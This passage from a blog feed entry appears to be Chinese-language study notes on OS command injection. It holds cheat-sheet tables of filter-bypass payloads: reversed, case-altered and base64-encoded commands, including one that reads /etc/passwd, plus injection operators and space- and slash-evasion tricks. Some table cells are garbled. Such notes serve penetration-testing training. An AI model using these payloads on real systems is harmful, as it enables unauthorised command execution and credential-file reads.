Bypass"></a>Blacklisted Command Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><strong>Character Insertion</strong></td><td></td></tr><tr><td><code>&#39;</code> or <code>&quot;</code></td><td>Total must be even</td></tr><tr><td><code>$@</code> or <code>\</code></td><td>Linux only</td></tr><tr><td><strong>Case Manipulation</strong></td><td></td></tr><tr><td><code>$(tr &quot;[A-Z]&quot; &quot;[a-z]&quot;&lt;&lt;&lt;&quot;WhOaMi&quot;)</code></td><td>Execute command regardless of cases</td></tr><tr><td><code>$(a=&quot;WhOaMi&quot;;printf %s &quot;$&#123;a,,&#125;&quot;)</code></td><td>Another variation of the technique</td></tr><tr><td><strong>Reversed Commands</strong></td><td></td></tr><tr><td>&#96;echo ‘whoami’</td><td>rev&#96;</td></tr><tr><td><code>$(rev&lt;&lt;&lt;&#39;imaohw&#39;)</code></td><td>Execute reversed command</td></tr><tr><td><strong>Encoded Commands</strong></td><td></td></tr><tr><td>&#96;echo -n ‘cat &#x2F;etc&#x2F;passwd</td><td>grep 33’</td></tr><tr><td><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></td><td>Execute b64 encoded string</td></tr></tbody></table><hr><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="Filtered-Character-Bypass-1"><a href="#Filtered-Character-Bypass-1" class="headerlink" title="Filtered Character Bypass"></a>Filtered Character Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-ChildItem Env:</code></td><td>Can be used to view all environment variables - (PowerShell)</td></tr><tr><td><strong>Spaces</strong></td><td></td></tr><tr><td><code>%09</code></td><td>Using tabs instead of spaces</td></tr><tr><td><code>%PROGRAMFILES:~10,-5%</code></td><td>Will be replaced with a space - (CMD)</td></tr><tr><td><code>$env:PROGRAMFILES[10]</code></td><td>Will be replaced with a space - (PowerShell)</td></tr><tr><td><strong>Other Characters</strong></td><td></td></tr><tr><td><code>%HOMEPATH:~0,-17%</code></td><td>Will be replaced with <code>\</code> - (CMD)</td></tr><tr><td><code>$env:HOMEPATH[0]</code></td><td>Will be replaced with <code>\</code> - (PowerShell)</td></tr></tbody></table><hr><h2 id="Blacklisted-Command-Bypass-1"><a href="#Blacklisted-Command-Bypass-1" class="headerlink" title="Blacklisted Command Bypass"></a>Blacklisted Command Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><strong>Character Insertion</strong></td><td></td></tr><tr><td><code>&#39;</code> or <code>&quot;</code></td><td>Total must be even</td></tr><tr><td><code>^</code></td><td>Windows only (CMD)</td></tr><tr><td><strong>Case Manipulation</strong></td><td></td></tr><tr><td><code>WhoAmi</code></td><td>Simply send the character with odd cases</td></tr><tr><td><strong>Reversed Commands</strong></td><td></td></tr><tr><td><code>&quot;whoami&quot;[-1..-20] -join &#39;&#39;</code></td><td>Reverse a string</td></tr><tr><td><code>iex &quot;$(&#39;imaohw&#39;[-1..-20] -join &#39;&#39;)&quot;</code></td><td>Execute reversed command</td></tr><tr><td><strong>Encoded Commands</strong></td><td></td></tr><tr><td><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&#39;whoami&#39;))</code></td><td>Encode a string with base64</td></tr><tr><td><code>iex &quot;$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;dwBoAG8AYQBtAGkA&#39;)))&quot;</code></td><td>Execute b64 encoded string</td></tr></tbody></table><h2 id="Command-Injection-Methods"><a href="#Command-Injection-Methods" class="headerlink" title="Command Injection Methods"></a>Command Injection Methods</h2><p>要将附加命令注入到预期命令中，我们可以使用以下任何运算符：</p><table><thead><tr><th><strong>Injection Operator</strong></th><th><strong>Injection Character</strong></th><th><strong>URL-Encoded Character</strong></th><th><strong>Executed Command</strong></th></tr></thead><tbody><tr><td>Semicolon</td><td><code>;</code></td><td><code>%3b</code></td><td>Both</td></tr><tr><td>New Line</td><td><code>\n</code></td><td><code>%0a</code></td><td>Both</td></tr><tr><td>Background</td><td><code>&amp;</code></td><td><code>%26</code></td><td>Both (second output generally shown first)</td></tr><tr><td>Pipe</td><td>&#96;</td><td>&#96;</td><td><code>%7c</code></td></tr><tr><td>AND</td><td><code>&amp;&amp;</code></td><td><code>%26%26</code></td><td>Both (only if first succeeds)</td></tr><tr><td>OR</td><td>&#96;</td><td></td><td>&#96;</td></tr><tr><td>Sub-Shell</td><td>&#96;&#96;&#96;&#96;</td><td><code>%60%60</code></td><td>Both (Linux-only)</td></tr><tr><td>Sub-Shell</td><td><code>$()</code></td><td><code>%24%28%29</code></td><td>Both (Linux-only)</td></tr></tbody></table><p>注意：唯一的例外可能是分号；，如果使用Windows命令行（CMD）执行命令，则该命令将不起作用，但如果使用Windows PowerShell执行命令，该命令仍将起作用。</p><table><thead><tr><th><strong>Injection Type</strong></th><th><strong>Operators</strong></th></tr></thead><tbody><tr><td>SQL Injection</td><td><code>&#39;</code> <code>,</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr><tr><td>Command Injection</td><td><code>;</code> <code>&amp;&amp;</code></td></tr><tr><td>LDAP Injection</td><td><code>*</code> <code>(</code> <code>)</code> <code>&amp;</code> &#96;</td></tr><tr><td>XPath Injection</td><td><code>&#39;</code> <code>or</code> <code>and</code> <code>not</code> <code>substring</code> <code>concat</code> <code>count</code></td></tr><tr><td>OS Command Injection</td><td><code>;</code> <code>&amp;</code> &#96;</td></tr><tr><td>Code Injection</td><td><code>&#39;</code> <code>;</code> <code>--</code> <code>/* */</code> <code>$()</code> <code>$&#123;&#125;</code> <code>#&#123;&#125;</code> <code>%&#123;&#125;</code> <code>^</code></td></tr><tr><td>Directory Traversal&#x2F;File Path Traversal</td><td><code>../</code> <code>..\\</code> <code>%00</code></td></tr><tr><td>Object Injection</td><td><code>;</code> <code>&amp;</code> &#96;</td></tr><tr><td>XQuery Injection</td><td><code>&#39;</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr><tr><td>Shellcode Injection</td><td><code>\x</code> <code>\u</code> <code>%u</code> <code>%n</code></td></tr><tr><td>Header Injection</td><td><code>\n</code> <code>\r\n</code> <code>\t</code> <code>%0d</code> <code>%0a</code> <code>%09</code></td></tr></tbody></table><h2 id="Blacklisted-Characters"><a href="#Blacklisted-Characters" class="headerlink" title="Blacklisted Characters"></a>Blacklisted Characters</h2><p>web应用程序可能有一个列入黑名单的字符列表，如果命令中包含这些字符，它将拒绝请求。PHP代码可能如下所示：</p><pre><code class="php">$blacklist = [&#39;&amp;&#39;, &#39;|&#39;, &#39;;&#39;, ...SNIP...];foreach ($blacklist as $character) &#123;    if (strpos($_POST[&#39;ip&#39;], $character) !== false) &#123;        echo &quot;Invalid input&quot;;    &#125;&#125;</code></pre><h2 id="Identifying-Blacklisted-Character"><a href="#Identifying-Blacklisted-Character" class="headerlink" title="Identifying Blacklisted Character"></a>Identifying Blacklisted Character</h2><p>我们将请求减少到一次一个字符，看看它何时被阻止。</p><h2 id="Bypass-Blacklisted-Spaces"><a href="#Bypass-Blacklisted-Spaces" class="headerlink" title="Bypass Blacklisted Spaces"></a>Bypass Blacklisted Spaces</h2><p>我们会看到，大多数注射经营者确实被列入黑名单。但是，换行符通常不会被列入黑名单，因为有效负载本身可能需要它。我们知道，在Linux和Windows中，换行符都可以用于附加命令，所以让我们尝试将其用作注入运算符：</p><h4 id="Using-Tabs"><a href="#Using-Tabs" class="headerlink" title="Using Tabs"></a>Using Tabs</h4><p>使用制表符（%09）而不是空格是一种可行的技术，因为Linux和Windows都接受参数之间带有制表符的命令，并且它们的执行方式相同</p><ul><li><code>%0a</code>：这表示 ASCII 值为 10 的字符，它是换行符（Line Feed，LF）的 ASCII 值。</li><li><code>%09</code>：这表示 ASCII 值为 9 的字符，它是水平制表符（Tab）的 ASCII 值。</li></ul><h4 id="Using-IFS"><a href="#Using-IFS" class="headerlink" title="Using $IFS"></a>Using $IFS</h4><p>使用（$IFS）Linux环境变量也可以工作，因为它的默认值是一个空格和一个选项卡，可以在命令参数之间工作。因此，如果我们在空格所在的位置使用${IFS}，则变量应自动替换为空格，并且我们的命令应该有效。</p><blockquote><p><code>$IFS</code> 是一个环境变量，在 Unix 和类 Unix 操作系统中使用。它代表 “Internal Field Separator”（内部字段分隔符），用于定义用于分隔字符的字符串。</p></blockquote><h4 id="Using-Brace-Expansion"><a href="#Using-Brace-Expansion" class="headerlink" title="Using Brace Expansion"></a>Using Brace Expansion</h4><p>还有许多其他方法可以用来绕过空间过滤器。例如，我们可以使用Bash-Brace Expansion功能，该功能会自动在大括号之间的参数之间添加空格，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ &#123;ls,-la&#125;</code></pre><h1 id="Bypassing-Other-Blacklisted-Characters"><a href="#Bypassing-Other-Blacklisted-Characters" class="headerlink" title="Bypassing Other Blacklisted Characters"></a>Bypassing Other Blacklisted Characters</h1><p>除了注入运算符和空格字符外，一个非常常见的黑名单字符是斜杠（&#x2F;）或反斜杠（\）字符，因为在Linux或Windows中指定目录是必要的。我们可以使用多种技术来生成我们想要的任何字符，同时避免使用列入黑名单的字符。</p><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><p>我们可以利用许多技术在有效载荷中设置斜线。我们可以用来替换斜杠（或任何其他字符）的一种技术是通过&#x3D;&#x3D;Linux环境变量&#x3D;&#x3D;，就像我们对${IFS}所做的那样。虽然${IFS}被直接替换为空格，但斜杠或分号没有这样的环境变量。然而，这些字符可以在环境变量中使用，并且我们可以指定字符串的开始和长度来完全匹配这个字符。 例如，如果我们查看Linux中的$PATH环境变量，它可能如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo $&#123;PATH&#125;/usr/local/bin:/usr/bin:/bin:/usr/games</code></pre><p>因此，如果我们从0字符开始，并且只使用长度为1的字符串，那么我们将只使用&#x2F;字符，我们可以在有效载荷中使用：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo $&#123;PATH:0:1&#125;/</code></pre><blockquote><p>参数扩展语法是 Shell 编程中一种用于操作和处理变量值的特殊语法。它允许你从变量值中提取子字符串、执行替换操作、计算长度等等。参数扩展可以用于在脚本中处理字符串、变量和命令的输出。</p><p>在大多数 Unix-like Shell（如 Bash、Zsh、sh 等）中，有几种常用的参数扩展形式：</p><ol><li><code>$&#123;variable&#125;</code>：用于引用变量的值。例如，<code>$&#123;PATH&#125;</code> 表示引用 <code>PATH</code> 变量的值。</li><li><code>$&#123;variable:-default&#125;</code>：如果变量未定义或为空，则使用默认值。例如，<code>$&#123;USERNAME:-guest&#125;</code> 表示如果 <code>USERNAME</code> 变量未定义或为空，使用默认值 “guest”。</li><li><code>$&#123;variable:=default&#125;</code>：如果变量未定义或为空，则将其设置为默认值。例如，<code>$&#123;EDITOR:=nano&#125;</code> 表示如果 <code>EDITOR</code> 变量未定义或为空，设置为 “nano”。</li><li><code>$&#123;variable:offset:length&#125;</code>：从变量值中提取子字符串。例如，<code>$&#123;NAME:0:3&#125;</code> 表示从 <code>NAME</code> 变量的值中提取前三个字符。</li><li><code>$&#123;variable#pattern&#125;</code> 和 <code>$&#123;variable##pattern&#125;</code>：从变量值的开头移除匹配的模式。<code>#</code> 会移除最短匹配，<code>##</code> 会移除最长匹配。</li><li><code>$&#123;variable%pattern&#125;</code> 和 <code>$&#123;variable%%pattern&#125;</code>：从变量值的末尾移除匹配的模式。<code>%</code> 会移除最短匹配，<code>%%</code> 会移除最长匹配。</li><li>&#96;$</li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;检测基本操作系统命令注入漏洞的过程与利用此类漏洞的过程相同。我们试图通过各种注入方法附加我们的命令。如果命令输出与预期的通常结果不同，则我们已成功利用该漏洞。对于更高级的命令注入漏洞，情况可能并非如此，因为我们可能会利用各种模糊方法或代码审查来识别潜在的命令注入弱点。然后，我们可以逐步构建我们的有效载荷，直到我们实现命令注入。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
</feed>
